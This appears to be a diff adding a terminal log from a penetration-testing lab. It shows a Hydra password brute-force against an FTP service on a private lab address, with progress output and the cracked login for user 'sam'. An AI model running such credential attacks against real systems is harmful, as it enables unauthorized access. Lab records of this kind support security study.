@@ -1,0 +1,14 @@
+hydra -l sam -P mut_password.list ftp://10.129.198.200 -t 48 -I
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-04 15:55:00
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 48 tasks per 1 server, overall 48 tasks, 94044 login tries (l:1/p:94044), ~1960 tries per task
+[DATA] attacking ftp://10.129.198.200:21/
+[STATUS] 728.00 tries/min, 728 tries in 00:01h, 93316 to do in 02:09h, 48 active
+[STATUS] 682.33 tries/min, 2047 tries in 00:03h, 91997 to do in 02:15h, 48 active
+[STATUS] 677.71 tries/min, 4744 tries in 00:07h, 89300 to do in 02:12h, 48 active
+[STATUS] 682.07 tries/min, 10231 tries in 00:15h, 83813 to do in 02:03h, 48 active
+[21][ftp] host: 10.129.198.200   login: sam   password: B@tm@n2022!
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-04 16:20:27
